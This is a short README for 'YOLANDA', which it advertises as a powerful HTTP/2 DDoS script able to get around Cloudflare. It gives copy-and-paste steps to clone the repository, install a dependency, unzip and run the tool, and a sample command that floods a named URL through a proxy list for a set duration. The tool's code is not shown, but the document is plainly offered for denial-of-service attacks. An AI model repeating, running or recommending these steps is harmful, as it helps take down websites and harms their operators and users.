# YOLANDA
Powerful http/2 DDoS Script, with mix method! great for cloudflare


# Install
- copy & paste
```
git clone https://github.com/MsYor/YOLANDA; cd YOLANDA

pip3 install httpx

unzip YOLANDA.zip

python3 http_proxy.py

chmod +x YOLANDA

./YOLANDA
```
# Example:
./YOLANDA https://tls.mrrage.xyz 60 1 proxy.txt
